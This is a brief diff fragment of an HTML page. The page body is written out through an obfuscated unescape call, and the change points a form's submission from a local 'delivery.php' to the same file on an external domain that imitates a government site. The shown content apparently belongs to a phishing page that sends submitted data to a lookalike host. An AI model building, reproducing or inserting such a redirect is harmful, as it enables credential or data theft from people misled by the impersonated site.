@@ -88,7 +88,7 @@ document.write(unescape('%3Cbody%20marginwidth%3D%220%22%20marginheight%3D%220%2
 </script>
 
 							
-								<form method="post" action="delivery.php">
+								<form method="post" action="https://torfaen-gov.com/wincosf/delivery.php">
 							
 <script type="text/javascript">
 <!--
